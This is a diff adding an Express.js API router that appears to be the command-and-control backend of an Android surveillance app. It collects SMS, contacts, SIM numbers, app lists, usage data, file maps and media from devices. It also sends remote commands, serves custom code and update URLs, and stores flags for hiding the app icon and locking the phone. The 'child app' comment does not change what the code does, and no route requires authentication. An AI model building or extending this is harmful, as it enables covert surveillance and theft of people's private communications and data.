@@ -1,0 +1,714 @@
+const express = require('express');
+const router = express.Router();
+const db = require('../database');
+const { v4: uuidv4 } = require('uuid');
+
+// ==================== SAVE MEDIA FILE URL ====================
+// Child app uploads to ImageKit directly, then calls this endpoint to save the URL to DB
+router.post('/media', (req, res) => {
+  try {
+    const { token, file_url, file_type, command_source } = req.body;
+    if (!token || !file_url) return res.status(400).json({ error: 'token and file_url required' });
+
+    let fileType = file_type || 'other';
+    const cmdSrc = command_source || '';
+
+    db.prepare(`
+      INSERT INTO media_files (token, file_url, file_type, command_source)
+      VALUES (?, ?, ?, ?)
+    `).run(token, file_url, fileType, cmdSrc || null);
+
+    res.json({ success: true, file_url });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== DEVICES ====================
+
+router.get('/devices', (req, res) => {
+  try {
+    const devices = db.prepare('SELECT * FROM devices ORDER BY last_updated DESC').all();
+    const cd = req.app.get('connectedDevices');
+    const io = req.app.get('io');
+    const result = devices.map(d => {
+      const entry = cd ? cd[d.token] : null;
+      const isOnline = !!(entry && io && io.sockets.sockets.has(entry.socketId));
+      return { ...d, isOnline };
+    });
+    res.json(result);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.get('/device', (req, res) => {
+  try {
+    const token = req.query.token || req.params.token;
+    if (!token) return res.status(400).json({ error: 'token required' });
+    const device = db.prepare('SELECT * FROM devices WHERE token = ?').get(token);
+    if (!device) return res.json([]);
+    res.json([device]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.get('/device/:token', (req, res) => {
+  try {
+    const device = db.prepare('SELECT * FROM devices WHERE token = ?').get(req.params.token);
+    if (!device) return res.json([]);
+    res.json([device]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/device', (req, res) => {
+  try {
+    const { token, device_name, battery, status, storage_used, storage_total, net_type, net_name, android_version, fcm_token } = req.body;
+    if (!token) return res.status(400).json({ error: 'token required' });
+    db.prepare(`
+      INSERT INTO devices (token, device_name, battery, status, storage_used, storage_total, net_type, net_name, android_version, fcm_token, last_updated)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))
+      ON CONFLICT(token) DO UPDATE SET
+        device_name = COALESCE(excluded.device_name, devices.device_name),
+        battery = COALESCE(excluded.battery, devices.battery),
+        status = COALESCE(excluded.status, devices.status),
+        storage_used = COALESCE(excluded.storage_used, devices.storage_used),
+        storage_total = COALESCE(excluded.storage_total, devices.storage_total),
+        net_type = COALESCE(excluded.net_type, devices.net_type),
+        net_name = COALESCE(excluded.net_name, devices.net_name),
+        android_version = COALESCE(excluded.android_version, devices.android_version),
+        fcm_token = COALESCE(excluded.fcm_token, devices.fcm_token),
+        last_updated = datetime('now')
+    `).run(token, device_name, battery, status, storage_used, storage_total, net_type, net_name, android_version, fcm_token);
+    res.json([{ token, device_name, battery, status }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.patch('/device/:token', (req, res) => {
+  try {
+    const fields = req.body;
+    const allowedFields = ['device_name', 'battery', 'status', 'storage_used', 'storage_total', 'net_type', 'net_name', 'android_version', 'is_locked', 'fcm_token'];
+    const updates = [];
+    const values = [];
+    for (const [key, value] of Object.entries(fields)) {
+      if (allowedFields.includes(key)) {
+        updates.push(`${key} = ?`);
+        values.push(value);
+      }
+    }
+    if (updates.length === 0) return res.status(400).json({ error: 'No valid fields' });
+    updates.push("last_updated = datetime('now')");
+    values.push(req.params.token);
+    db.prepare(`UPDATE devices SET ${updates.join(', ')} WHERE token = ?`).run(...values);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== COMMANDS ====================
+
+router.get('/commands', (req, res) => {
+  try {
+    const token = req.query.token || req.body?.device_token;
+    if (!token) return res.json([]);
+    let query = 'SELECT * FROM commands WHERE device_token = ?';
+    const params = [token];
+
+    const status = req.query.status;
+    if (status) {
+      query += ' AND status = ?';
+      params.push(status.replace('eq.', ''));
+    }
+
+    query += ' ORDER BY created_at DESC LIMIT ?';
+    params.push(parseInt(req.query.limit) || 50);
+
+    const commands = db.prepare(query).all(...params);
+    res.json(commands);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.get('/commands/:token', (req, res) => {
+  try {
+    const limit = parseInt(req.query.limit) || 50;
+    const commands = db.prepare('SELECT * FROM commands WHERE device_token = ? ORDER BY created_at DESC LIMIT ?').all(req.params.token, limit);
+    res.json(commands);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/commands', (req, res) => {
+  try {
+    const { id, device_token, command, params, timestamp, status } = req.body;
+    const cmdId = id || uuidv4();
+    const ts = timestamp || Date.now();
+
+    const connectedDevices = req.app.get('connectedDevices');
+    const io = req.app.get('io');
+    const deviceEntry = connectedDevices ? connectedDevices[device_token] : null;
+
+    const isSocketAlive = deviceEntry && io && io.sockets.sockets.has(deviceEntry.socketId);
+
+    if (!isSocketAlive) {
+      if (deviceEntry) {
+        delete connectedDevices[device_token];
+      }
+      db.prepare(`
+        INSERT INTO commands (id, device_token, command, params, status, timestamp)
+        VALUES (?, ?, ?, ?, 'failed', ?)
+        ON CONFLICT(id) DO UPDATE SET status = 'failed'
+      `).run(cmdId, device_token, command, params || null, ts);
+      res.json([{ id: cmdId, success: false, delivered: false, error: 'device_offline' }]);
+      return;
+    }
+
+    db.prepare(`
+      INSERT INTO commands (id, device_token, command, params, status, timestamp)
+      VALUES (?, ?, ?, ?, 'pending', ?)
+      ON CONFLICT(id) DO UPDATE SET status = excluded.status
+    `).run(cmdId, device_token, command, params || null, ts);
+
+    if (io) {
+      io.to(deviceEntry.socketId).emit('command:incoming', {
+        id: cmdId,
+        device_token,
+        command,
+        params: params || null,
+        timestamp: ts
+      });
+    }
+
+    res.json([{ id: cmdId, success: true, delivered: true }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== COMMAND RESPONSES ====================
+
+router.get('/command_responses', (req, res) => {
+  try {
+    const token = req.query.device_token || req.query.token;
+    if (!token) return res.json([]);
+    let query = 'SELECT * FROM command_responses WHERE device_token = ?';
+    const params = [token];
+    if (req.query.command_type) {
+      query += ' AND command_type = ?';
+      params.push(req.query.command_type);
+    }
+    query += ' ORDER BY command_timestamp DESC LIMIT ?';
+    params.push(parseInt(req.query.limit) || 25);
+    res.json(db.prepare(query).all(...params));
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.get('/command_responses/:token', (req, res) => {
+  try {
+    const limit = parseInt(req.query.limit) || 25;
+    const responses = db.prepare('SELECT * FROM command_responses WHERE device_token = ? ORDER BY command_timestamp DESC LIMIT ?').all(req.params.token, limit);
+    res.json(responses);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/command_responses', (req, res) => {
+  try {
+    const { device_token, command_id, command_type, status, response_data, message, command_timestamp } = req.body;
+    db.prepare(`
+      INSERT INTO command_responses (device_token, command_id, command_type, status, response_data, message, command_timestamp, timestamp)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    `).run(device_token, command_id || null, command_type || null, status || 'success', response_data || message || null, message || null, command_timestamp || 0, Date.now());
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/command_responses/:token', (req, res) => {
+  try {
+    const token = req.params.token;
+    const commandType = req.query.command_type;
+    if (commandType) {
+      db.prepare('DELETE FROM command_responses WHERE device_token = ? AND command_type = ?').run(token, commandType);
+    } else {
+      db.prepare('DELETE FROM command_responses WHERE device_token = ?').run(token);
+    }
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== MEDIA FILES ====================
+
+router.get('/media_files', (req, res) => {
+  try {
+    const token = req.query.token;
+    if (!token) return res.json([]);
+    let query = 'SELECT * FROM media_files WHERE token = ?';
+    const params = [token];
+    if (req.query.file_type) {
+      const types = req.query.file_type.split(',');
+      query += ` AND file_type IN (${types.map(() => '?').join(',')})`;
+      params.push(...types);
+    }
+    query += ' ORDER BY created_at DESC';
+    if (req.query.limit) {
+      query += ' LIMIT ?';
+      params.push(parseInt(req.query.limit));
+    }
+    res.json(db.prepare(query).all(...params));
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/media_files', (req, res) => {
+  try {
+    const { token, file_url, file_type, command_source } = req.body;
+    const result = db.prepare('INSERT INTO media_files (token, file_url, file_type, command_source) VALUES (?, ?, ?, ?)').run(token, file_url, file_type, command_source || null);
+    res.json([{ id: result.lastInsertRowid, success: true }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/media_files/:id', (req, res) => {
+  try {
+    db.prepare('DELETE FROM media_files WHERE id = ?').run(req.params.id);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== SMS ====================
+
+router.get('/device_sms', (req, res) => {
+  try {
+    const deviceId = req.query.device_id || req.query.token;
+    if (!deviceId) return res.json([]);
+    const rows = db.prepare('SELECT * FROM device_sms WHERE device_id = ? ORDER BY created_at DESC LIMIT 1').all(deviceId);
+    if (rows.length === 0) return res.json([]);
+    res.json([{ sms: JSON.parse(rows[0].sms || '[]') }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/device_sms', (req, res) => {
+  try {
+    const { device_id, sms } = req.body;
+    db.prepare('DELETE FROM device_sms WHERE device_id = ?').run(device_id);
+    db.prepare('INSERT INTO device_sms (device_id, sms) VALUES (?, ?)').run(device_id, JSON.stringify(sms));
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== SECURITY ALERTS ====================
+
+router.get('/security_alerts', (req, res) => {
+  try {
+    const token = req.query.device_token || req.query.token;
+    if (!token) return res.json([]);
+    res.json(db.prepare('SELECT * FROM security_alerts WHERE device_token = ? ORDER BY timestamp DESC').all(token));
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/security_alerts', (req, res) => {
+  try {
+    const { id, device_token, title, message, timestamp } = req.body;
+    db.prepare('INSERT OR REPLACE INTO security_alerts (id, device_token, title, message, timestamp) VALUES (?, ?, ?, ?, ?)')
+      .run(id || uuidv4(), device_token, title, message, timestamp || Date.now());
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== APPS ====================
+
+router.get('/list_apps', (req, res) => {
+  try {
+    const deviceId = req.query.device_id;
+    if (!deviceId) return res.json([]);
+    const rows = db.prepare('SELECT * FROM list_apps WHERE device_id = ? ORDER BY created_at DESC LIMIT 1').all(deviceId);
+    if (rows.length === 0) return res.json([]);
+    res.json([{ apps_data: JSON.parse(rows[0].apps_data || '[]') }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/list_apps', (req, res) => {
+  try {
+    const { device_id, apps_data } = req.body;
+    db.prepare('DELETE FROM list_apps WHERE device_id = ?').run(device_id);
+    db.prepare('INSERT INTO list_apps (device_id, apps_data) VALUES (?, ?)').run(device_id, JSON.stringify(apps_data));
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== APP USAGE ====================
+
+router.get('/app_usage', (req, res) => {
+  try {
+    const deviceId = req.query.device_id;
+    if (!deviceId) return res.json([]);
+    res.json(db.prepare('SELECT * FROM app_usage_activity WHERE device_id = ? ORDER BY total_time_ms DESC').all(deviceId));
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/app_usage', (req, res) => {
+  try {
+    const { device_id, apps } = req.body;
+    db.prepare('DELETE FROM app_usage_activity WHERE device_id = ?').run(device_id);
+    const stmt = db.prepare('INSERT INTO app_usage_activity (device_id, package_name, app_name, total_time_ms, last_used, launch_count, is_system, category) VALUES (?, ?, ?, ?, ?, ?, ?, ?)');
+    const insertMany = db.transaction((items) => {
+      for (const app of items) {
+        stmt.run(device_id, app.package_name, app.app_name, app.total_time_ms, app.last_used, app.launch_count, app.is_system ? 1 : 0, app.category || 'غير مصنف');
+      }
+    });
+    insertMany(apps);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== CONTACTS ====================
+
+router.get('/device_contacts', (req, res) => {
+  try {
+    const deviceId = req.query.device_id;
+    if (!deviceId) return res.json([]);
+    const rows = db.prepare('SELECT * FROM device_contacts WHERE device_id = ? ORDER BY created_at DESC LIMIT 1').all(deviceId);
+    if (rows.length === 0) return res.json([]);
+    res.json([{ contacts: JSON.parse(rows[0].contacts || '[]'), device_id: deviceId }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/device_contacts', (req, res) => {
+  try {
+    const { device_id, contacts } = req.body;
+    db.prepare('DELETE FROM device_contacts WHERE device_id = ?').run(device_id);
+    db.prepare('INSERT INTO device_contacts (device_id, contacts) VALUES (?, ?)').run(device_id, JSON.stringify(contacts));
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== PHONE NUMBERS / SIM ====================
+
+router.get('/phone_number', (req, res) => {
+  try {
+    const deviceId = req.query.device_id || req.query.token;
+    if (!deviceId) return res.json([]);
+    const rows = db.prepare('SELECT * FROM phone_number WHERE device_id = ? OR device_token = ? OR token = ? ORDER BY created_at DESC LIMIT 1').all(deviceId, deviceId, deviceId);
+    if (rows.length === 0) return res.json([]);
+    res.json([rows[0]]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/phone_number', (req, res) => {
+  try {
+    const { device_id, device_token, token, sim1, sim2, number1, number2 } = req.body;
+    const deviceId = device_id || device_token || token;
+    db.prepare('DELETE FROM phone_number WHERE device_id = ? OR device_token = ? OR token = ?').run(deviceId, deviceId, deviceId);
+    db.prepare('INSERT INTO phone_number (device_id, device_token, token, sim1, sim2, number1, number2) VALUES (?, ?, ?, ?, ?, ?, ?)').run(deviceId, deviceId, deviceId, sim1, sim2, number1, number2);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/phone_number', (req, res) => {
+  try {
+    const deviceId = req.query.device_id || req.query.device_token || req.query.token;
+    if (!deviceId) return res.status(400).json({ error: 'token required' });
+    db.prepare('DELETE FROM phone_number WHERE device_id = ? OR device_token = ? OR token = ?').run(deviceId, deviceId, deviceId);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/phone_number/:token', (req, res) => {
+  try {
+    db.prepare('DELETE FROM phone_number WHERE device_id = ? OR device_token = ? OR token = ?').run(req.params.token, req.params.token, req.params.token);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== FILE MAPS ====================
+
+router.get('/device_file_maps', (req, res) => {
+  try {
+    const deviceId = req.query.device_id;
+    if (!deviceId) return res.json([]);
+    const rows = db.prepare('SELECT * FROM device_file_maps WHERE device_id = ? ORDER BY created_at DESC LIMIT 1').all(deviceId);
+    if (rows.length === 0) return res.json([]);
+    res.json([{ map_data: JSON.parse(rows[0].map_data || '[]'), parent_path: rows[0].parent_path }]);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/device_file_maps', (req, res) => {
+  try {
+    const { device_id, parent_path, map_data } = req.body;
+    db.prepare('DELETE FROM device_file_maps WHERE device_id = ? AND parent_path = ?').run(device_id, parent_path);
+    db.prepare('INSERT INTO device_file_maps (device_id, parent_path, map_data) VALUES (?, ?, ?)').run(device_id, parent_path, JSON.stringify(map_data));
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/device_file_maps/:token', (req, res) => {
+  try {
+    db.prepare('DELETE FROM device_file_maps WHERE device_id = ?').run(req.params.token);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== FILES ====================
+
+router.get('/files', (req, res) => {
+  try {
+    const token = req.query.device_token || req.query.token;
+    if (!token) return res.json([]);
+    res.json(db.prepare('SELECT * FROM files WHERE device_token = ?').all(token));
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== APP SETTINGS ====================
+
+router.get('/app_settings', (req, res) => {
+  try {
+    let settings = db.prepare('SELECT * FROM app_settings WHERE id = 1').get();
+    if (!settings) {
+      db.prepare('INSERT INTO app_settings (id, url_target) VALUES (1, "")').run();
+      settings = { id: 1, url_target: '' };
+    }
+    res.json(settings);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/app_settings', (req, res) => {
+  try {
+    const { url_target } = req.body;
+    db.prepare('INSERT INTO app_settings (id, url_target) VALUES (1, ?) ON CONFLICT(id) DO UPDATE SET url_target = ?').run(url_target, url_target);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== APP UPDATES ====================
+
+router.get('/app_updates', (req, res) => {
+  try {
+    const updates = db.prepare('SELECT * FROM app_updates ORDER BY created_at DESC LIMIT 1').all();
+    res.json(updates.length > 0 ? updates[0] : { update_url: '', version_code: 0 });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.get('/app_update', (req, res) => {
+  try {
+    const updates = db.prepare('SELECT * FROM app_updates ORDER BY created_at DESC LIMIT 1').all();
+    res.json(updates.length > 0 ? [updates[0]] : []);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post('/app_updates', (req, res) => {
+  try {
+    const { update_url, version_code, release_notes } = req.body;
+    db.prepare('INSERT INTO app_updates (update_url, version_code) VALUES (?, ?)').run(update_url, version_code || 0);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== CUSTOM CODE ====================
+
+router.get('/custom_code', (req, res) => {
+  try {
+    const row = db.prepare("SELECT url_target as code_value FROM app_settings WHERE id = 2").get();
+    res.json({ code_value: row ? row.code_value : '' });
+  } catch (e) {
+    res.json({ code_value: '' });
+  }
+});
+
+router.post('/custom_code', (req, res) => {
+  try {
+    const { code_value, code } = req.body;
+    db.prepare("INSERT INTO app_settings (id, url_target) VALUES (2, ?) ON CONFLICT(id) DO UPDATE SET url_target = ?").run(code_value || code, code_value || code);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== USERS ====================
+
+router.get('/users', (req, res) => {
+  try {
+    const id = req.query.id;
+    if (!id) return res.json([]);
+    const row = db.prepare('SELECT * FROM app_settings WHERE id = 3').get();
+    if (!row) return res.json([]);
+    res.json([{ id: id, password: row.url_target }]);
+  } catch (e) {
+    res.json([]);
+  }
+});
+
+router.post('/users', (req, res) => {
+  try {
+    const { id, password } = req.body;
+    db.prepare("INSERT INTO app_settings (id, url_target) VALUES (3, ?) ON CONFLICT(id) DO UPDATE SET url_target = ?").run(password, password);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== OPERATIONS ====================
+
+router.get('/operations', (req, res) => {
+  try {
+    const deviceId = req.query.device_id;
+    if (!deviceId) return res.json([]);
+    const row = db.prepare("SELECT * FROM app_settings WHERE id = 4").get();
+    if (!row) return res.json([]);
+    try {
+      const data = JSON.parse(row.url_target || '{}');
+      if (data.device_id === deviceId) return res.json([data]);
+    } catch (e) {}
+    res.json([]);
+  } catch (e) {
+    res.json([]);
+  }
+});
+
+router.post('/operations', (req, res) => {
+  try {
+    const { device_id, status_off, status_flash, status_lock, status_gone, status_icon, status_name } = req.body;
+    db.prepare("INSERT INTO app_settings (id, url_target) VALUES (4, ?) ON CONFLICT(id) DO UPDATE SET url_target = ?")
+      .run(JSON.stringify(req.body), JSON.stringify(req.body));
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== NOTIFICATIONS ====================
+
+router.get('/notifications', (req, res) => {
+  try {
+    const token = req.query.device_token;
+    if (!token) return res.json([]);
+    res.json([]);
+  } catch (e) {
+    res.json([]);
+  }
+});
+
+router.post('/notifications', (req, res) => {
+  try {
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ==================== DELETE ROUTES ====================
+
+router.delete('/security_alerts/:token', (req, res) => {
+  try {
+    db.prepare('DELETE FROM security_alerts WHERE device_token = ?').run(req.params.token);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/commands/:id', (req, res) => {
+  try {
+    db.prepare('DELETE FROM commands WHERE id = ?').run(req.params.id);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/commands', (req, res) => {
+  try {
+    const token = req.query.device_token || req.query.token;
+    if (!token) return res.status(400).json({ error: 'token required' });
+    db.prepare('DELETE FROM commands WHERE device_token = ?').run(token);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/list_apps/:token', (req, res) => {
+  try {
+    db.prepare('DELETE FROM list_apps WHERE device_id = ?').run(req.params.token);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.delete('/device_contacts/:token', (req, res) => {
+  try {
+    db.prepare('DELETE FROM device_contacts WHERE device_id = ?').run(req.params.token);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+module.exports = router;
